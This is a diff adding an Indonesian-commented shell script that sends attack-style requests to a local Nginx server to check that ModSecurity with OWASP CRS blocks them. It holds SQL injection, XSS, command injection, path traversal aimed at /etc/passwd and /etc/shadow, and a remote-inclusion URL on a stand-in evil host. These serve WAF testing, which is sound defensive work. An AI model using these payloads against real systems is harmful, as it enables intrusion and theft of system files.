@@ -1,0 +1,106 @@
+# POC OWASP WAF TESTS (WSL)
+# Tujuan: Uji bahwa ModSecurity + OWASP CRS memblokir request mencurigakan.
+# Target default: localhost (Nginx WAF) di mesin Anda sendiri.
+# Aman untuk riset internal Anda (tidak ditujukan ke sistem pihak ketiga).
+
+# ==============================
+# 0) PRE-CHECK
+# ==============================
+# Pastikan service aktif dulu:
+# sudo systemctl status nginx --no-pager | head -n 20
+# sudo systemctl status waf-observatory-backend --no-pager | head -n 20
+
+BASE_URL="http://127.0.0.1"
+
+# Helper: tampilkan hanya HTTP status code
+status() {
+  url="$1"
+  shift
+  code=$(curl -s -o /dev/null -w "%{http_code}" "$url" "$@")
+  echo "$code | $url"
+}
+
+# ==============================
+# 1) SQL INJECTION (OWASP A03 Injection)
+# ==============================
+status "$BASE_URL/?id=1' OR '1'='1--"
+status "$BASE_URL/?user=admin' UNION SELECT 1,2,3--"
+status "$BASE_URL/?q=';WAITFOR DELAY '0:0:5'--"
+
+# POST body SQLi
+curl -s -o /dev/null -w "%{http_code} | POST SQLi body\n" \
+  -X POST "$BASE_URL/" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data "username=admin' OR 1=1--&password=test"
+
+# ==============================
+# 2) XSS (OWASP A03 Injection)
+# ==============================
+status "$BASE_URL/?search=<script>alert(1)</script>"
+status "$BASE_URL/?x=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
+status "$BASE_URL/?msg=%3Csvg/onload=alert(document.domain)%3E"
+
+# ==============================
+# 3) COMMAND INJECTION / RCE-LIKE PATTERN
+# ==============================
+status "$BASE_URL/?cmd=;cat+/etc/passwd"
+status "$BASE_URL/?cmd=%7C%7Cid"
+status "$BASE_URL/?exec=%24%28uname+-a%29"
+
+# ==============================
+# 4) PATH TRAVERSAL / LFI
+# ==============================
+status "$BASE_URL/?file=../../../../etc/passwd"
+status "$BASE_URL/?page=..%2F..%2F..%2F..%2Fetc%2Fshadow"
+status "$BASE_URL/?template=..\\..\\..\\windows\\win.ini"
+
+# ==============================
+# 5) RFI / URL INJECTION
+# ==============================
+status "$BASE_URL/?include=http://evil.example/shell.txt"
+status "$BASE_URL/?load=https://example.com/payload.php"
+
+# ==============================
+# 6) PROTOCOL ANOMALY / MALICIOUS HEADERS
+# ==============================
+# Host numeric IP biasanya memicu rule protocol enforcement
+curl -s -o /dev/null -w "%{http_code} | Numeric Host header\n" \
+  "$BASE_URL/" -H "Host: 127.0.0.1"
+
+# Suspicious User-Agent (scanner signature-ish)
+curl -s -o /dev/null -w "%{http_code} | Scanner UA\n" \
+  "$BASE_URL/" -H "User-Agent: sqlmap/1.9#stable"
+
+# ==============================
+# 7) BAD BOT / KNOWN ATTACK TOOL SIGNATURES (POC)
+# ==============================
+status "$BASE_URL/?tool=sqlmap"
+status "$BASE_URL/?agent=nikto"
+status "$BASE_URL/?probe=acunetix"
+
+# ==============================
+# 8) MIXED PAYLOADS (REALISTIC ATTACK CHAIN POC)
+# ==============================
+status "$BASE_URL/?id=1%27%20OR%201=1--&xss=<script>alert(1)</script>&file=../../etc/passwd"
+
+curl -s -o /dev/null -w "%{http_code} | Mixed POST payload\n" \
+  -X POST "$BASE_URL/" \
+  -H "Content-Type: application/json" \
+  -d '{"username":"admin'"'"' OR 1=1--","comment":"<svg/onload=alert(1)>","path":"../../../../etc/passwd"}'
+
+# ==============================
+# 9) CEK AUDIT LOG MODSEC
+# ==============================
+# Lihat 60 baris terakhir (harus ada id rule CRS, msg, dan status 403 untuk yang diblokir)
+# sudo tail -n 60 /var/log/modsecurity/audit.log
+
+# Cari rule SQLi, XSS, Path Traversal
+# sudo grep -E "942100|941|930|949110|Access denied" /var/log/modsecurity/audit.log | tail -n 40
+
+# ==============================
+# 10) RINGKASAN HASIL (OPSIONAL)
+# ==============================
+# Jalankan cepat semua status POC:
+# bash POC_OWASP_WAF_TESTS_WSL.txt
+# Catatan: file ini adalah daftar command shell. Jika ingin run semua sekaligus,
+# hapus baris komentar atau copy blok command yang diinginkan.
